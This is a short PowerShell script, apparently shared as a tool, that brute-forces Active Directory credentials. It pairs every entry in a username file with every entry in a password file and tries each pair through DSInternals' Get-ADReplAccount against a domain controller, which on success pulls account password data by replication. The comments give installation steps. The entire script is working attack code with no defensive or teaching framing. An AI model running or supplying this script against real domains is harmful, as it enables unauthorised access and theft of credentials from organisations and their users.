#
#Get-ADReplAccount-Brute-Force v0.1 by improvizza
#Do brute force attack with two files users.txt with all possible usernames and pswds.txt with all possible passwords.
#First install GET-ADReplAccount following instructions:
#     Update powerShell (>=v5.0)
#     Install library with: $ Install-Module -Name DSInternals
#     More info at: https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
#
Get-Content C:\pswds.txt | Foreach-Object {
    $pass = $_
    Get-Content C:\users.txt | Foreach-Object {
		$user = $_
		echo $user
		echo $pass
		$securePwd = ConvertTo-SecureString $pass -AsPlainText -Force
		$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $User, $securePwd
		Get-ADReplAccount -SamAccountName <samAccountName> -Domain <domainName> -Server <domainNameControllerIP> -Credential $cred -Protocol TCP
	}
}
